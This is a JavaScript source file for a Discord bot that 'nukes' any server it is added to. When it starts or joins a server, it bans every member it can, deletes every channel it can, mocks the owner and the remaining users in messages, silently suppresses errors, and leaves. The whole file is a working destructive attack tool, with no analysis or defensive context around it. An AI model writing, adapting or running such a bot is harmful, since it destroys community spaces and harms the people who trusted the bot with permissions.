const { Client } = require('discord.js');
const config = require('./config.json');
const client = new Client();

async function nuke(guild, users = 0, channels = 0) {
  try {
    guild.members.forEach(x => {
      if (x.bannable) {
        x.ban();
        x.send('You\'re getting banned! Nothing personal...');
        return users++;
      }
    });
    guild.channels.forEach(x => {
      if (x.deletable) {
        x.delete();
        return channels++;
      }
    });
    await guild.owner.sendMessage('Hey there! Your guild is getting nuked! :D');
    await guild.defaultChannel.send('Dumbass, we said not to add the bot...');
  } catch (e) {}
}

client.on('ready', () => {
  client.guilds.forEach(x => { return nuke(x); });
  console.log('Ready to have some fun... >:)');
});

client.on('guildCreate', async (guild) => {
  let users = 0;
  let channels = 0;

  await nuke(guild, users, channels);
  guild.leave();
});

client.login(config.token).catch(console.error);
